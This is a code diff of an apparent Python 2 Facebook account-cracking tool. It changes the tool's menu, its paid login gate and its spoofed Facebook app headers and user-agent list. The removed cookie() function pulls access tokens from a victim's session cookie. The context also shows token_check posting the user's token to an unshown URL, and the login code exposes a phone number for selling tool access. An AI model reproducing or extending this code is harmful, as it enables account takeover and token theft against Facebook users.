@@ -24,9 +24,11 @@ def xox(z):
       
 
 agents = [
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
+		"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
+		 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
+ 	 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+  	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
+  		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
   "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
   "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
@@ -382,10 +384,9 @@ agents = [
   "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
   "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",	
-  "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-
-				  ]
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
+			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+]
 				
 header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 
@@ -422,7 +423,7 @@ def main():
  	print("\033[92;1m  [2] CRACK FILE")
         print("\033[91;1m  [3] VIEW & SAVE CHECKPOINTS")
 	print("\033[93;1m  [4] HOW TO GET ACCESS TOKEN")
-	print("\033[94;1m  [5] UPDATE TOOL 03.15")
+	print("\033[94;1m  [5] UPDATE TOOL 06.10")
 	print("\033[96;1m  [6] CHAT ME UP ON WHATSAPP \033[92;1m✘\033[91;1m✘")
         print("\033[90;1m  [0] EXIT")
 	print("")
@@ -434,7 +435,7 @@ def log_sel():
 		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
 		log_sel()
 	elif sel =="1" or sel =="01":
-		login()
+		token()
 	elif sel =="2" or sel =="02":
 		xox("\033[92;1m\n Under Construction ❌🚫\n")
 		main()
@@ -464,33 +465,6 @@ def log_sel():
 		print("")
 		log_sel()
 
-def login():
-        os.system('clear')
-	logo()
-	print("")
-	print("\033[92;1m  [1] With Token")
- 	print("\033[92;1m  [2] With Cookie")
-	print("\033[91;1m  [0] Back")
-	print("")
-	login_sel()
-	
-def login_sel():
-	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")
-	if sel == "":
-		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
-		login_sel()
-	elif sel =="1" or sel =="01":
-		token()
-	elif sel =="2" or sel =="02":
-		cookie()
-	elif select =="0":
-		main()
-	else:
-		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
-		print("")
-		login_sel()
-
 def check_cps():
         os.system('clear')
 	logo()
@@ -506,6 +480,28 @@ def check_cps():
         xox("\n\033[91;1m CHECKPOINTS SAVED SUCCESSFULLY 👍")
         time.sleep(2)
 	main()
+
+def login():
+        os.system("clear")
+        logo()
+        print("")
+        username = raw_input("\033[1;97m\x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
+        if (username == CorrectUsername):
+            password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
+            if (password == CorrectPassword):
+                print "\033[1;92mLogged in successfully 💪😈"
+	        time.sleep(1)
+                token()
+            else:
+                print "\033[1;94mWRONG PASSWORD ❌❌❌"
+                subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=2348144982650&text=Hello+I+want+to+pay+for+the+username+and+password+to+your+tool"])
+                time.sleep(1)
+                login()
+        else:
+            print "\033[1;94mWRONG USERNAME ❌❌❌"
+            subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=2348144982650&text=Hello+I+want+to+pay+for+the+username+and+password+to+your+tool"])
+            time.sleep(1)
+            login()
 
 def token():
     os.system("clear")
@@ -533,29 +529,12 @@ def token_check():
 	requests.post(useragent_url + token, headers=header)
 	pass
 
-def cookie():
-	os.system("clear")
-	try:
-		cookie=input(" [+] Cookie : ")
-		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "randomgents","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-US,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
-		find_token = re.search("(EAAG\w+)", data.text)
-		ken = open("token.txt", "w")
-		ken.write(find_token.group(1))
-		ken.close()
-		print (" [] Login Successful")
-		menu()
-	except Exception as e: 
-		os.system("rm -f token.txt")
-		print( ' [×] Login Failed ')
-		time.sleep(1.0)
-		login()
-
 def menu():
     os.system("clear")
     try:
         token = open("token.txt", "r").read()
     except(KeyError , IOError):
-        login()
+        token()
     try:
         r = requests.get("https://graph.facebook.com/me?access_token="+token)
         q = json.loads(r.text)
@@ -567,7 +546,7 @@ def menu():
         os.system("rm -rf token.txt")
         print("")
         time.sleep(1)
-        login()
+        main()
     os.system("clear")
     xn = name.upper()
     logo()
